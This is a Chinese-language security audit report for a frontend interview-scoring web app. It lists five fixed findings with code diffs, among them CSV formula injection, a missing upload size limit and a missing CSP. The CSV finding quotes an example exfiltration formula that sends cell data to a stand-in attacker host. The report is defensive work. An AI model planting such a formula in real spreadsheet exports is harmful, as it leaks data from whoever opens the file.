# Interview Scorecard 2.0 — 安全审计报告

**审计日期**: 2026-04-09  
**审计范围**: 全部源文件（`app.js`, `index.html`, `styles.css`, 配置/测试样本文件）  
**项目类型**: 纯前端单页应用（零依赖，无后端服务）

---

## 一、审计总结

| 严重等级 | 发现数量 | 已修复 |
|---------|---------|--------|
| CRITICAL | 1 | 1 |
| MEDIUM | 2 | 2 |
| LOW | 2 | 2 |
| **合计** | **5** | **5** |

**全部安全问题已修复。**

---

## 二、已发现并修复的安全问题

### 问题 1: `currentConfig` 未定义变量引用（CRITICAL）

**文件**: `app.js`  
**影响行**: 第810、814、842、846、891、892行（修复前行号）  
**问题描述**: 代码中引用了 `currentConfig` 变量，但该变量从未在任何作用域中定义。这导致自动评分（`autoScoreBtn`）、自动总结（`autoSummaryBtn`）、保存转录结果（`saveTranscriptBtn`）三个核心功能在运行时抛出 `ReferenceError`，完全无法工作。  
**风险**: 功能完全失效，用户无法使用自动评分和总结功能。  
**修复方案**: 将所有 `currentConfig` 引用替换为已定义的模块级变量 `editorState`（在第390行声明，存储当前问卷配置状态）。

```diff
- if (!currentConfig) {
+ if (!editorState) {

- const results = autoScoreFromTranscript(window._currentTranscript, currentConfig);
+ const results = autoScoreFromTranscript(_currentTranscript, editorState);

- const summary = generateSummary(window._lastScoreResults, currentConfig);
+ const summary = generateSummary(_lastScoreResults, editorState);
```

---

### 问题 2: CSV 公式注入漏洞（MEDIUM）

**文件**: `app.js` — `toCsv()` 函数  
**影响行**: 第706-712行（修复前行号）  
**问题描述**: `toCsv()` 函数在导出 CSV 时，仅对双引号进行了转义（`"` → `""`），但未防护以 `=`, `+`, `-`, `@`, `\t`, `\r` 开头的值。当用户在面试评分备注中输入此类内容并导出 CSV 后，在 Excel/WPS 中打开时，这些值会被解释为公式并自动执行，可能导致信息泄露或恶意命令执行。  
**攻击向量**: 面试官在评分备注中输入 `=HYPERLINK("http://evil.com?data="&A1,"Click")` 等公式。  
**修复方案**: 对以危险字符开头的单元格值，添加单引号前缀使其作为纯文本处理。

```diff
  row.map((cell) => {
-   const value = cell == null ? '' : String(cell);
+   let value = cell == null ? '' : String(cell);
+   if (/^[=+\-@\t\r]/.test(value)) { value = "'" + value; }
    return `"${value.replaceAll('"', '""')}"`;
  })
```

---

### 问题 3: 文件上传无大小限制（MEDIUM）

**文件**: `app.js`  
**影响行**: 第920行（拖拽上传）、第935行（拖拽 readAsText）、第1342-1369行（文件选择器上传）  
**问题描述**: 三处 `FileReader.readAsText(file)` 调用前均未检查 `file.size`。用户若上传超大文件（如数 GB 的文本文件），会导致浏览器尝试将整个文件内容加载到内存中，造成页面卡死或浏览器崩溃（内存溢出 DoS）。  
**修复方案**: 在每处 `FileReader` 调用前添加 10MB 大小限制检查。

```diff
  const file = e.dataTransfer.files[0];
  if (!file) return;
+ const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
+ if (file.size > MAX_FILE_SIZE) {
+   alert('文件过大，请选择小于 10MB 的文件');
+   return;
+ }
  const reader = new FileReader();
```

---

### 问题 4: 全局变量污染（LOW）

**文件**: `app.js`  
**影响行**: `window._currentTranscript`（第928、1354行）、`window._lastScoreResults`（第815行）  
**问题描述**: 转录数据和评分结果挂载在 `window` 全局对象上，可通过浏览器控制台或页面中嵌入的第三方脚本直接访问和篡改。攻击者可修改评分结果或注入恶意数据。  
**修复方案**: 将全局变量替换为文件作用域内的模块级变量。

```diff
  let editorState = null;
  let currentQuestionnaireFileName = '';
+ let _currentTranscript = null;
+ let _lastScoreResults = null;

  // 所有引用处
- window._currentTranscript = parsed;
+ _currentTranscript = parsed;

- window._lastScoreResults = results;
+ _lastScoreResults = results;
```

---

### 问题 5: 缺少 Content Security Policy（LOW）

**文件**: `index.html`  
**问题描述**: 页面未设置任何 CSP（Content Security Policy）策略。虽然当前项目未引用外部资源，但缺少 CSP 意味着如果将来引入了 XSS 漏洞，攻击者可以无限制地加载外部脚本、样式或建立网络连接。  
**修复方案**: 添加严格的 CSP meta 标签，仅允许加载同源资源。

```diff
  <meta charset="UTF-8" />
+ <meta http-equiv="Content-Security-Policy"
+       content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
```

---

## 三、已确认安全的防护措施

以下安全措施在审计中确认已正确实现：

| 防护项 | 状态 | 说明 |
|--------|------|------|
| XSS 防护（`escapeHtml`） | ✅ 良好 | 覆盖 `&`, `<`, `>`, `"`, `'` 五种字符；所有 `innerHTML` 拼接处均已使用 |
| DOM 操作安全 | ✅ 良好 | 转录预览使用 `textContent` 而非 `innerHTML` |
| URL 对象释放 | ✅ 良好 | `URL.createObjectURL` / `URL.revokeObjectURL` 正确配对 |
| localStorage 保护 | ✅ 良好 | 读写操作均有 `try-catch` 保护 |
| 文件输入类型限制 | ✅ 良好 | `accept` 属性限制了可选文件类型 |
| 无服务端漏洞 | ✅ 不适用 | 纯前端项目，无路径遍历/SQL注入/SSRF等服务端风险 |
| 无敏感信息硬编码 | ✅ 良好 | 未发现 API 密钥、令牌等敏感信息 |

---

## 四、建议改进（非安全问题，供参考）

1. **localStorage 数据结构验证**: 当前从 `localStorage` 恢复数据时有 `try-catch` 保护，但未验证恢复数据的结构完整性。建议添加 schema 验证。

2. **输入长度限制**: 面试官备注等文本输入框未设置 `maxlength`，理论上可输入超长文本。建议添加合理长度限制。

---

## 五、修改文件清单

| 文件 | 修改内容 |
|------|---------|
| `app.js` | 修复 `currentConfig` bug、CSV 公式注入防护、文件大小限制、全局变量封装 |
| `index.html` | 添加 CSP meta 标签 |

---

*报告结束*
